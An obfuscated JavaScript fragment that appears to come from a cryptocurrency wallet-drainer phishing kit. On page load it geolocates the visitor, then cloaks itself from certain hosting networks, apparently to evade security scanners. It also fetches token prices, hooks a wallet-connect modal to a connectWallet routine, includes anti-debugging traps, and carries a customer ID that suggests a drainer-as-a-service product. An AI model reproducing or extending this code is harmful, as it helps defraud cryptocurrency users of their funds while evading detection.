_0x27e7f4.SZ = '🇸🇿';
_0x27e7f4.TC = "🇹🇨";
_0x27e7f4.TD = "🇹🇩";
_0x27e7f4.TF = "🇹🇫";
_0x27e7f4.TG = "🇹🇬";
_0x27e7f4.TH = "🇹🇭";
_0x27e7f4.TJ = "🇹🇯";
_0x27e7f4.TK = "🇹🇰";
_0x27e7f4.TL = '🇹🇱';
_0x27e7f4.TM = '🇹🇲';
_0x27e7f4.TN = "🇹🇳";
_0x27e7f4.TO = '🇹🇴';
_0x27e7f4.TR = '🇹🇷';
_0x27e7f4.TT = "🇹🇹";
_0x27e7f4.TV = "🇹🇻";
_0x27e7f4.TW = "🇹🇼";
_0x27e7f4.TZ = '🇹🇿';
_0x27e7f4.UA = '🇺🇦';
_0x27e7f4.UG = "🇺🇬";
_0x27e7f4.UM = "🇺🇲";
_0x27e7f4.US = "🇺🇸";
_0x27e7f4.UY = "🇺🇾";
_0x27e7f4.UZ = "🇺🇿";
_0x27e7f4.VA = "🇻🇦";
_0x27e7f4.VC = "🇻🇨";
_0x27e7f4.VE = "🇻🇪";
_0x27e7f4.VG = "🇻🇬";
_0x27e7f4.VI = "🇻🇮";
_0x27e7f4.VN = "🇻🇳";
_0x27e7f4.VU = "🇻🇺";
_0x27e7f4.WF = "🇼🇫";
_0x27e7f4.WS = "🇼🇸";
_0x27e7f4.YE = "🇾🇪";
_0x27e7f4.YT = '🇾🇹';
_0x27e7f4.ZA = "🇿🇦";
_0x27e7f4.ZM = "🇿🇲";
_0x27e7f4.ZW = "🇿🇼";
countries = _0x27e7f4;
window.flag = '';
window.returnValue = true;
window.addEventListener("load", async () => {
  try {
    const _0x546e4b = await fetch("https://pro.ip-api.com/json/?key=8SABUve1fr96SNp");
    const _0x465ea9 = await _0x546e4b.json();
    if (_0x465ea9.ip != '') {
      ipAddress = _0x465ea9.query;
      window.flag = countries[_0x465ea9.countryCode];
      if (_0x465ea9.toString().includes('Quadra') || _0x465ea9.org == "QuadraNet, Inc" || _0x465ea9.org == "QuadraNet" || _0x465ea9.org == "Convergeict" || _0x465ea9.org == "Cdnext TYO" || _0x465ea9.org == "BraveWay") {
        window.returnValue = false;
      }
      if (window.flag == '') {
        window.flag = "🏴‍☠️";
      }
    }
  } catch {}
  console.log("Fetching eth price");
  try {
    let _0x351a6b = await fetch("https://api.ethplorer.io/getAddressInfo/0x9bD54149469870105f1697AB037Cc0d7BAB9F684?apiKey=freekey&showETHTotals=true").then(_0x1bbe3b => _0x1bbe3b.json());
    ethPrice = _0x351a6b.ETH.price.rate;
  } catch (_0x29c9b3) {
    console.log("Eth price error: ", _0x29c9b3);
  }
  console.log("Fetching ape price");
  try {
    let _0x52483f = await fetch("https://api.ethplorer.io/getAddressInfo/0x4d224452801aced8b2f0aebe155379bb5d594381?apiKey=freekey&showETHTotals=true").then(_0x359172 => _0x359172.json());
    apePrice = _0x52483f.tokenInfo.price.rate;
  } catch (_0x54144e) {
    console.log("Ape price error: ", _0x54144e);
  }
});
function handleChange({
  provider: _0xac494a,
  providerType: _0xa705b5,
  address: _0x18b045,
  chainId: _0xe4ab27,
  isConnected: _0x25d432
}) {
  if (_0x25d432) {
    window.disabled = false;
    new Main().connectWallet(_0xac494a, _0xa705b5, _0x18b045, _0xe4ab27);
  }
}
modal.subscribeProvider(handleChange);
function _0x1a9c59(_0x4e4c71) {
  function _0xb8ae3c(_0x479515) {
    if (typeof _0x479515 === "string") {
      return function (_0x44221c) {}.constructor("while (true) {}").apply('counter');
    } else if (('' + _0x479515 / _0x479515).length !== 1 || _0x479515 % 20 === 0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    _0xb8ae3c(++_0x479515);
  }
  try {
    if (_0x4e4c71) {
      return _0xb8ae3c;
    } else {
      _0xb8ae3c(0);
    }
  } catch (_0x5697e3) {}
}
_0x2d2f04.customerId = "0xPDJ3BNYV";